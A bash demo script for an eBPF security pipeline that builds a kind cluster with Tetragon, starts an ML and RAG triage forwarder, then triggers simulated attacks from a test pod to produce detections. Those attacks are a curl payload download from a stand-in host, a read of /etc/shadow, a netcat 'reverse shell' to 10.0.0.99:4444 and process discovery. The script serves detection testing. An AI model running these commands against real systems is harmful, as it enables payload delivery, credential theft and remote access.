#!/bin/bash
set -e

# ── Virtual Environment ──────────────────────────────────────────
if [ -f ".venv/bin/activate" ]; then
    source .venv/bin/activate
fi

echo "============================================================"
echo "  Sentinel-Core: Real eBPF Security Pipeline (Dashboard Sync)"
echo "============================================================"

# ── 1. Tooling dependencies ────────────────────────────────────────
mkdir -p bin
export PATH="$PWD/bin:$PATH"

echo "[1/6] Checking tooling dependencies..."
if ! command -v kind &>/dev/null; then
    curl -sLo ./bin/kind https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
    chmod +x ./bin/kind
fi
if ! command -v kubectl &>/dev/null; then
    curl -sLo ./bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl"
    chmod +x ./bin/kubectl
fi
if ! command -v helm &>/dev/null; then
    curl -fsSL -o /tmp/get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
    chmod 700 /tmp/get_helm.sh
    HELM_INSTALL_DIR=$PWD/bin USE_SUDO="false" /tmp/get_helm.sh >/dev/null 2>&1 || true
    rm -f /tmp/get_helm.sh
fi
echo "  ✓ Tools ready"

CLUSTER_NAME="sentinel-cluster"

# ── 2. Kubernetes Cluster (with Health Check) ────────────────────
echo ""
echo "[2/6] Provisioning Kubernetes cluster..."
if kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
    # Check if cluster is healthy (can list nodes)
    if ! kubectl get nodes &>/dev/null; then
        echo "  ⚠️  Cluster exists but is unhealthy. Recreating..."
        kind delete cluster --name "${CLUSTER_NAME}"
    else
        echo "  ✓ Cluster '${CLUSTER_NAME}' is active"
    fi
fi

if ! kind get clusters 2>/dev/null | grep -q "^${CLUSTER_NAME}$"; then
    echo "  ↳ Creating kind cluster..."
    cat > /tmp/kind-config.yaml <<'KINDEOF'
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
nodes:
- role: control-plane
  extraMounts:
  - hostPath: /sys/kernel/debug
    containerPath: /sys/kernel/debug
    propagation: Bidirectional
  - hostPath: /sys/kernel/tracing
    containerPath: /sys/kernel/tracing
    propagation: Bidirectional
KINDEOF
    kind create cluster --name "${CLUSTER_NAME}" --config /tmp/kind-config.yaml
    rm -f /tmp/kind-config.yaml
fi

# Ensure tracefs/debugfs mounts inside node
docker exec ${CLUSTER_NAME}-control-plane mount -t tracefs tracefs /sys/kernel/tracing 2>/dev/null || true
docker exec ${CLUSTER_NAME}-control-plane mount -t debugfs debugfs /sys/kernel/debug 2>/dev/null || true

# ── 3. Tetragon eBPF Agent ───────────────────────────────────────
echo ""
echo "[3/6] Deploying Tetragon eBPF agent..."
if ! helm list -n kube-system 2>/dev/null | grep -q tetragon; then
    helm repo add cilium https://helm.cilium.io >/dev/null 2>&1
    helm repo update >/dev/null 2>&1
    helm install tetragon cilium/tetragon -n kube-system -f tetragon-values.yaml --wait --timeout=180s
fi
kubectl apply -f sentinel-policy.yaml
echo "  ✓ Tetragon is LIVE"

# ── 4. Deploy Attacker Pod ───────────────────────────────────────
echo ""
echo "[4/6] Preparing attacker workload..."
kubectl delete pod attacker-pod --ignore-not-found=true >/dev/null 2>&1
kubectl run attacker-pod --image=alpine/curl:latest --restart=Never -- sleep 3600
kubectl wait --for=condition=ready pod attacker-pod --timeout=60s
echo "  ✓ Workload ready"

# ── 5. Start Pipeline (Background) ──────────────────────────────
echo ""
echo "[5/6] Starting ML + RAG Pipeline..."
docker compose up -d redis chromadb
sleep 2

export PYTHONPATH="$PWD:$PYTHONPATH"

# Generate the improved live script
cat << 'PYEOF' > _sentinel_live.py
import sys
import time
import json
import logging
import threading
from pathlib import Path

# Suppress noisy library logs
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("sentence_transformers").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

import uvicorn
from forwarder.api import app as fastapi_app
from forwarder.api import set_redis_status, set_ml_triage
from forwarder.config import Config
from forwarder.main import process_line
from forwarder.ml_triage import MLTriage
from forwarder.publisher import EventPublisher
import forwarder.main

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s │ %(name)-22s │ %(levelname)-5s │ %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("sentinel.live")

config = Config()

# API server
def run_api():
    uvicorn.run(fastapi_app, host="0.0.0.0", port=8081, log_level="warning")
threading.Thread(target=run_api, daemon=True).start()

# ML Triage - Try huge model if exists, fallback to config
huge_model = Path("xgboost_model.json")
if huge_model.exists() and huge_model.stat().st_size > 1000000:
    logger.info("🧠 Found high-capacity model in root. Overriding config.")
    ml_path = huge_model
else:
    ml_path = Path(config.ML_MODEL_PATH)

ml = MLTriage(
    model_path=ml_path,
    feature_list_path=Path(config.FEATURE_LIST_PATH)
)
set_ml_triage(ml)
forwarder.main._ml_triage = ml

# Publisher
pub = EventPublisher(config)
set_redis_status(pub.is_connected)

# RAG check
try:
    from orchestrator import analyze_alert, ORCHESTRATOR_AVAILABLE
    rag_enabled = ORCHESTRATOR_AVAILABLE
except ImportError:
    rag_enabled = False

print("\n🚀 Sentinel API: http://127.0.0.1:8081")
print("📡 Pipeline INITIALIZED and monitoring events...")

event_count = 0
try:
    for line in sys.stdin:
        line = line.strip()
        if not line or not line.startswith("{"):
            continue
        try:
            sentinel_event = process_line(line, pub)
            if sentinel_event:
                event_count += 1
                triage = sentinel_event.get("triage", {})
                grade = triage.get("grade", "UNKNOWN")
                score = float(triage.get("confidence", 0.0))

                if rag_enabled and grade in ("TP", "BP") and event_count <= 20:
                    try:
                        raw = json.loads(line)
                        analyze_alert(raw_event=raw, guide_score=score, guide_grade=grade, stream=False)
                    except Exception as orch_err:
                        logger.warning("Orchestrator error: %s", orch_err)
        except Exception as e:
            logger.error("Event decode error: %s", e)

except KeyboardInterrupt:
    logger.info("Pipeline terminated.")
    pub.close()
    sys.exit(0)
PYEOF

# Start the pipeline stream in the background
echo "  ↳ Initializing ML models and starting stream (bg)..."
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout -f --since=1s | python _sentinel_live.py &
PIPELINE_PID=$!

# Wait for API to be ready
echo "  ↳ Waiting for API readiness..."
until curl -s http://127.0.0.1:8081/health &>/dev/null; do
    sleep 2
    if ! ps -p $PIPELINE_PID > /dev/null; then
        echo "  ❌ Pipeline failed to start. Check logs."
        exit 1
    fi
done
sleep 5 # Extra buffer for model loading

# ── 6. Execute Attacks (Now that pipeline is listening) ──────────
echo ""
echo "[6/6] Executing REAL attacks (Pipeline is now LISTENING)..."
echo "  ↳ Attack 1: Payload Download"
kubectl exec attacker-pod -- curl -sk http://evil-example.com/p.sh -o /dev/null 2>/dev/null || true
echo "  ↳ Attack 2: Sensitive File Access"
kubectl exec attacker-pod -- cat /etc/shadow 2>/dev/null || true
echo "  ↳ Attack 3: Reverse Shell"
kubectl exec attacker-pod -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" 2>/dev/null || true
echo "  ↳ Attack 4: Discovery"
kubectl exec attacker-pod -- ps aux >/dev/null 2>&1 || true

echo "  ✓ Attacks completed"
echo ""
echo "============================================================"
echo "  FINAL EVENT ANALYSIS (Array View)"
echo "============================================================"
sleep 3
# Fetch the results array from the API, just as before
curl -s http://127.0.0.1:8081/events/latest | python -m json.tool

echo ""
echo "📡 Pipeline is still running in background (PID: $PIPELINE_PID)."
echo "📡 Dashboard can connect to http://localhost:8081"
echo "Press Ctrl+C to tail logs or 'kill $PIPELINE_PID' to stop."
wait $PIPELINE_PID
